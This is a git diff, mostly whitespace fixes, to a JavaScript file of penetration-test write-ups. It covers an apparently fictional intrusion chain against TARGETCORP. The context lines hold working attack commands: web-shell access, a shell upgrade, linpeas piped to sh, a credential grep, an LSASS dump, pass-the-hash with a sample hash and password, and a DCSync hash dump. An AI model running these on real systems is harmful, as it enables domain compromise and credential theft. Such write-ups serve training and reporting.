@@ -13602,8 +13602,7 @@ const writeups = [
         },
       },
       {
-        heading: "3. Active Reconnaissance — Port Scanning & Service Enumeration",
-        
+        heading: "3. Active Reconnaissance — Port Scanning & Service Enumeration",      
         paragraphs: [ ],
         
         paragraphs: [
@@ -13632,8 +13631,7 @@ const writeups = [
   searchsploit citrix netscaler 13.0
   
   ===================================
-  
-  # Web application fingerprinting
+# Web application fingerprinting
   whatweb -a 3 https://targetcorp.com | tee whatweb_main.txt
   
   # Directory and endpoint discovery with feroxbuster
@@ -13747,7 +13745,7 @@ const writeups = [
   curl http://192.0.2.82:8080/shell/
 
 ========================
-          # Upgrade the basic netcat shell to an interactive PTY
+# Upgrade the basic netcat shell to an interactive PTY
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   # Ctrl+Z → stty raw -echo; fg → export TERM=xterm
   
@@ -13782,8 +13780,8 @@ const writeups = [
     | sh 2>/dev/null | tee /tmp/linpeas_out.txt
   
   # Manual checks to complement automated output
-  find / -perm -4000 -type f 2>/dev/null | xargs ls -la  # SUID binaries
-  sudo -l                                                   # sudo permissions
+  find / -perm -4000 -type f 2>/dev/null | xargs ls -la      # SUID binaries
+  sudo -l                                                    # sudo permissions
   
   # Look for writable cron jobs (classic privesc vector)
   ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null
@@ -13797,8 +13795,8 @@ const writeups = [
     /etc/ /var/www/ /opt/ /home/ 2>/dev/null \\
     | grep -v Binary | tee /tmp/cred_grep.txt
           
-          ================================
-          # Confirm we can write to the cron script
+================================
+# Confirm we can write to the cron script
   ls -la /opt/scripts/backup.sh
   # -rwxrwxr-x 1 root tomcat 245 Mar 12 09:22 /opt/scripts/backup.sh
   
@@ -13883,8 +13881,8 @@ const writeups = [
     --zip -c All \\
     -ns 10.10.1.10
           
-          =======================================
-          # Enumerate AD objects in detail with ldapdomaindump
+=======================================
+# Enumerate AD objects in detail with ldapdomaindump
   proxychains ldapdomaindump \\
     -u 'TARGETCORP\\deploy' -p 'Summer2024!' \\
     10.10.1.10 -o /tmp/ldapdump/
@@ -13980,7 +13978,7 @@ const writeups = [
   proxychains python3 pypykatz lsa minidump lsass.dmp
 
 ===================================
-          # Pass-the-Hash — authenticate using the hash directly, no plaintext needed
+# Pass-the-Hash — authenticate using the hash directly, no plaintext needed
   proxychains python3 /opt/impacket/examples/psexec.py \\
     -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \\
     TARGETCORP/ITAdmin@10.10.1.50 cmd.exe
@@ -14032,8 +14030,8 @@ const writeups = [
     TARGETCORP/DC01\\$@DC01.targetcorp.local \\
     -dc-ip 10.10.1.10 -just-dc-user Administrator
 
-          =============================================
-          # Full DCSync — dump every hash in the domain
+=============================================
+# Full DCSync — dump every hash in the domain
   proxychains python3 /opt/impacket/examples/secretsdump.py \\
     -k -no-pass \\
     TARGETCORP/DC01\\$@DC01.targetcorp.local \\
@@ -14098,7 +14096,7 @@ const writeups = [
         heading: "13. Findings Summary & Severity Ratings",
         paragraphs: [
           "The engagement produced 23 distinct findings. The critical-severity items define the report's narrative: there was a clear, exploitable path from the public internet to full domain compromise, achievable in under a week by an attacker of moderate skill. The key findings are summarized below.",
-          "*CRITICAL* — Exposed Tomcat Manager with Default Credentials (CVSS 9.8): The Apache Tomcat management interface was internet-accessible and protected by default credentials alone. This provided unauthenticated remote code execution within minutes of discovery — the fastest initial access vector in the engagement.",
+          "CRITICAL — Exposed Tomcat Manager with Default Credentials (CVSS 9.8): The Apache Tomcat management interface was internet-accessible and protected by default credentials alone. This provided unauthenticated remote code execution within minutes of discovery — the fastest initial access vector in the engagement.",
           "CRITICAL — Unconstrained Kerberos Delegation Enabling Domain Compromise (CVSS 9.0): FILESRV01 was configured with Unconstrained Delegation. Combined with the MS-RPRN PrinterBug coercion technique, this allowed capture of the DC computer account's TGT and a subsequent DCSync that dumped every password hash in the domain.",
           "HIGH — Kerberoastable Service Accounts with Weak Passwords (CVSS 8.1): Three service accounts with SPNs registered were susceptible to offline TGS cracking. Two of the three had passwords that fell to standard wordlists in under 20 minutes.",
           "HIGH — Credentials and Infrastructure Details Exposed in Public GitHub (CVSS 7.5): A developer committed AWS credentials and internal configuration files — including VPN gateway hostnames and a dev team password pattern — to a public repository. The credentials were revoked but the topology data remained actionable.",
